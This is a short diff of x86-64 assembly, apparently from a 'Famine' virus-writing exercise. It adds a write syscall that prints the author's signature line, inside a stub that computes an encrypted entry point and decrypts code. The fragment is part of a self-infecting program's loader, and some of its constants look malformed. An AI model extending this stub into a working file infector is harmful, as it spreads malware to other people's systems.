@@ -6,6 +6,12 @@ _start:
 			cdq											; convert double to quad, 8 bite
 			imul	eax, 0
 
+			mov		edi, 1								; RDI, arg #1: fd
+			lea		rsi, [rel message]					; RSI, arg #2: char *
+			mov		edx, 53								; RDX, arg #3: len
+			add		eax, 1								; RAX, arg #4 or #number of system call (== write())
+			syscall
+			
 			lea		rax, [original_entry]
 			add		rax, qword [original_entry]
 			sub		rax, qword [encrypted_entry]		; QWORD [PTR]: the address expression will have the size of a 4-word (8 bytes)
@@ -29,7 +35,7 @@ decrypt_code:
 			mul		ecx									; counter from rcx
 			ret											; return
 
-message			db 'Famine version 1.0 (c)oded mar-2023 by jraye-slynell',10					; determine bite
+message			db 'Famine version 1.0 (c)oded mar-2023 by jraye-slynell', 10				; determine bite
 original_entry	dq 0x1000111001111111					; determine 8 bites
 encrypted_code	dq 0x1000011001110011
 encrypted_size	dq 0x1001001001001100
